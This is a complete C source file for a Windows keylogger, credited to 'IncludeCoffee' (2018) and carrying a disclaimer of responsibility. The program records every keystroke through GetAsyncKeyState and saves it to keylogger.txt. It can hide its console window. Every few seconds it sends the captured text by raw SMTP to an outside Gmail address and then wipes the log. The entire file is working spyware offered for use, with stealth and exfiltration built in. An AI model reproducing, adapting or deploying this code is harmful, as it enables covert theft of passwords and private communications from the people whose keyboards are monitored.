/// IncludeCoffee - 2018.
/// YouTube channel: https://www.youtube.com/channel/UCTm1VF82ZpX6HzX35z7e_9A
/// I'm NOT responsible for the malicious use of THIS program.

#include <stdio.h>
#include <windows.h>
#include <time.h>

#define INVISIBLE_CONSOLE 0 // Makes the console invisible (0 - False, 1 - True).
#define SILENT_CONSOLE 0 // Makes the console to show no output (0 - False, 1 - True).

#define LISTENER_TIMER 5
#define SENDER_SLEEP_TIME 100 // <- WARNING! Using a high value can cause data not to be captured
                              //             by the user's keyboard during the sending of a buffer.

#define FILE_NAME "keylogger.txt"

// Email sender defines:
#define GMAIL_SERVER "gmail-smtp-in.l.google.com"
#define EMAIL_FROM "tester@gmail.com"
#define EMAIL_TO "wickpunk@gmail.com"

void verifyStealthMode();
void savePressedKey(char pressedKey, char fileName[]);
int getPressedKeyBetweenASCII(int ASCIIValue1, int ASCIIValue2);
int getFileLength(char fileName[]);
char *getBufferFromFile(char fileName[]);
void overrideFile(char fileName[]);
void sendData(SOCKET socket, char data[]);
void sendEmail(char server[], char from[], char to[], char buffer[]);

void verifyStealthMode() {
    if(INVISIBLE_CONSOLE) {
        HWND stealth;
        AllocConsole();
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);
    }
}

void savePressedKey(char pressedKey, char fileName[]) {
    FILE *file = fopen(fileName, "a+");

    fputc(pressedKey, file);
    fclose(file);
}

int getPressedKeyBetweenASCII(int ASCIIValue1, int ASCIIValue2) {
    int pressedKey = 0;

    for(int character = ASCIIValue1; character <= ASCIIValue2; character++) {
        if(GetAsyncKeyState(character) == -32767) {
            pressedKey = character;
        }
    }

    return pressedKey;
}

int getFileLength(char fileName[]) {
    FILE *file = fopen(fileName, "rb");

    fseek(file, 0, SEEK_END);

    int fileLength = ftell(file);

    fclose(file);

    return fileLength;
}

char *getBufferFromFile(char fileName[]) {
    FILE *file = fopen(fileName, "rb");

    int fileLength = getFileLength(fileName);

    char *buffer = (char *) malloc(fileLength + 1);

    fread(buffer, sizeof(char), fileLength, file);

    buffer[fileLength] = '\0';

    fclose(file);

    return buffer;
}

void overrideFile(char fileName[]) {
    FILE *file = fopen(fileName, "w");

    fclose(file);
}

int main() {
    verifyStealthMode();

    clock_t timer;
    clock_t now = clock();

    while(1) {
        int pressedKey = getPressedKeyBetweenASCII(8, 255);

        if(pressedKey) {
            savePressedKey(pressedKey, FILE_NAME);

            now = clock();
        }

        timer = (clock() - now) / CLOCKS_PER_SEC;

        if(timer > LISTENER_TIMER) {
            int fileLength = getFileLength(FILE_NAME);

            if(fileLength > 0) {
                sendEmail(GMAIL_SERVER, EMAIL_FROM, EMAIL_TO, getBufferFromFile(FILE_NAME));

                overrideFile(FILE_NAME);
            }

            now = clock();
        } else if(!SILENT_CONSOLE) {
            system("cls");
            printf("Listening...");
            printf("\nTime to send next buffer: %ld\n\n", (LISTENER_TIMER - timer));
        }
    }

    return 0;
}

void sendData(SOCKET sock, char data[]) {
    send(sock, data, strlen(data), 0);
    Sleep(SENDER_SLEEP_TIME);

    if(!SILENT_CONSOLE) printf("\n%s", data);
}

void sendEmail(char server[], char from[], char to[], char buffer[]) {
    SOCKET sock;
    WSADATA wsaData;
    struct hostent *host;
    struct sockaddr_in dest;

    char data[3000];

    // Get socket and dest:
    WSAStartup(0x202, &wsaData);

    host = gethostbyname(server);

    memset(&dest, 0, sizeof(dest));
    memcpy(&(dest.sin_addr), host->h_addr, host->h_length);

    dest.sin_family = host->h_addrtype;
    dest.sin_port = htons(25);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Connect:
    connect(sock, (struct sockaddr *) &dest, sizeof(dest));
    Sleep(SENDER_SLEEP_TIME);

    // Send data packets, like:
    // HELO ip.test.com
    // MAIL FROM: <from@gmail.com>
    // RCPT TO: <to@gmail.com>
    // DATA
    // TO: from@gmail.com
    // FROM: to@gmail.com
    // SUBJECT: Keylogger
    // this is a test email from keylogger
    // .
    sprintf(data, "HELO me.somepalace.com\n");
    sendData(sock, data);

    sprintf(data, "MAIL FROM: <%s>\n", from);
    sendData(sock, data);

    sprintf(data, "RCPT TO: <%s>\n", to);
    sendData(sock, data);

    sprintf(data, "DATA\n");
    sendData(sock, data);

    sprintf(data, "TO: %s\nFROM: %s\nSUBJECT: Keylogger\n%s\r\n.\r\n", to, from, buffer);
    sendData(sock, data);

    sprintf(data, "QUIT\n");
    sendData(sock, data);

    if(!SILENT_CONSOLE) {
        printf("\nAll packets have been sended!");
        Sleep(5000);
        system("cls");
    }

    // Close socket and cleanup WSA:
    closesocket(sock);
    WSACleanup();
}
